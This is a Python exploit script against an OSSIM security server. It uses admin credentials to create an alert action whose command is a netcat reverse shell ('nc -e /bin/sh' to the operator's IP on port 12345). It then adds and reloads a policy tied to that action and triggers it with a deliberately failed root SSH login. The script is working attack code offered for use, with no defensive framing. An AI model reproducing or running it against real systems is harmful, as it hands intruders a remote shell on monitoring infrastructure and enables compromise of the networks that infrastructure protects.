#!/usr/bin/env python3

# OSSIM Obtain Reverse Shell from Malicious Action

# %%%%%%%%%%% Libraries %%%%%%%%%%%#

import base64
import getpass
import logging
import paramiko
import re
import requests
import urllib3
from colorama import Fore, Style
from colorama import init

init()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# %%%%%%%%%%% Constants %%%%%%%%%%%#

SEPARATOR = "[*] {0} [*]".format('=' * 110)

# %%%%%%%%%% Functions %%%%%%%%%#

def create_policy(ossimip):

	authurl = "https://" + ossimip + "/ossim/session/login.php"
	actionurl = "https://" + ossimip + "/ossim/action/modifyactions.php"
	getactionurl = "https://" + ossimip + "/ossim/action/getaction.php"
	getctxurl = "https://" + ossimip + \
				"/ossim/policy/policy.php?m_opt=configuration&sm_opt=threat_intelligence"
	policyurl = "https://" + ossimip + "/ossim/policy/newpolicy.php"
	reloadurl = "https://" + ossimip + "/ossim/conf/reload.php?what=policies&back=..%2Fpolicy" \
										"%2Fpolicy.php"
	ossimpass = getpass.getpass(
		Fore.CYAN + Style.BRIGHT + "[!] Enter OSSIM Admin Password: " + Style.RESET_ALL)
	localIP = input("[!] Enter your local IP address: ")
	actionid = ''
	ctxfinal = ''

	ossimpasswordb64 = base64.b64encode(ossimpass.encode("utf-8"))
	base64string = str(ossimpasswordb64, "utf-8")
	paramsauth = {'embed': '', 'bookmark_string': '', 'user': 'admin', 'passu': ossimpass,
					'pass': base64string}
	netcatcommand = "nc+-e+%2Fbin%2Fsh+" + localIP + "+12345"  # netcat reverse shell
	paramsaction = "id=&action=new&old_name=&action_name=testossim&old_descr=&descr=testossim" \
					"&action_type=2&only=on&cond=True&email_from=&email_to=&email_subject" \
					"=&email_message=&exec_command=" + netcatcommand + "&transferred_user="

	try:
		s = requests.Session()
		s.post(authurl, data = paramsauth, verify = False)
		s.headers.update({'Content-Type': 'application/x-www-form-urlencoded'})

		print(SEPARATOR)
		print("[!] Start a listener in port 12345, for example nc -lvp 12345")
		print(SEPARATOR)

		action = s.post(actionurl, data = paramsaction, verify = False)

		if action.status_code == 200 and "Action successfully updated" in action.text:

			actions = s.post(getactionurl,
								data = "page=1&rp=20&sortname=descr&sortorder=asc&query=&qtype=",
								verify = False)
			rows = actions.text.split('<row id=')

			for row in rows:

				if "testossim" in row:
					newrow = row.split("><cell><")
					actionid = str(newrow[0]).replace("'", "")
					print("[!] OSSIM Reverse Shell Action Created with ID " + actionid)

			ctx = s.get(getctxurl, verify = False)
			policyctx = re.findall(r'getpolicy\.php\?ctx=(.*?)&group', ctx.text)
			ctxfinal = str(policyctx[0])
			print("[!] OSSIM Policies CTX Obtained " + ctxfinal)

		else:
			print("[!] Error creating the OSSIM Reverse Shell Action")

		if actionid != '' and ctxfinal != '':

			paramspolicy = "descr=testossim&active=1&group=00000000000000000000000000000000&ctx=" \
							+ ctxfinal + \
							"&order=0&action=new&sources%5B%5D=00000000000000000000000000000000" \
							"&filterc=&dests%5B%5D=&filterd=&portsrc%5B%5D=0&portdst%5B%5D=0" \
							"&plug_type=0&plugins%5B0%5D=on&tax_pt=0&tax_cat=0&tax_subc=0&mboxs%5B" \
							"%5D=00000000000000000000000000000000&rep_act=0&rep_sev_lem=equal" \
							"&rep_sev=1&rep_rel_lem=equal&rep_rel=1&rep_dir=1&ev_sev_lem=equal" \
							"&ev_sev=1&ev_rel_lem=equal&ev_rel=1&tzone=US%2FCentral&date_type=1" \
							"&begin_hour=0&begin_minute=0&begin_day_week=1&begin_day_month=1" \
							"&begin_month=1&end_hour=23&end_minute=59&end_day_week=7&end_day_month" \
							"=31&end_month=12&actions%5B%5D=" + actionid + \
							"&sim=1&priority=-1&qualify=1&correlate=1&cross_correlate=1&store=1"

			policy = s.post(policyurl, data = paramspolicy, verify = False)

			if policy.status_code == 200 and "Policy successfully inserted" in policy.text:

				print("[!] OSSIM New Policy Created")
				reload = s.get(reloadurl, verify = False)

				if reload.status_code == 200 and "Reload completed successfully" in reload.text:
					print("[!] Policies Reloaded and Applied")
					generate_ssh_event(ossimip)

			else:
				print("[!] Error creating the OSSIM New Policy")

	except Exception as e:
		logging.error(e, exc_info = True)


def generate_ssh_event(ossimip):

	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(ossimip, username = 'root', password = '0ss1mr4nd0mp4ssw0rd')

	except paramiko.AuthenticationException:
		print(SEPARATOR)
		print("[!] SSH Failed Login Event Generated")
		print(Fore.RED + Style.BRIGHT + "[!] Reverse Shell Ready")
		print(Style.RESET_ALL + SEPARATOR)
		pass

# %%%%%%%%%% The End %%%%%%%%%%#
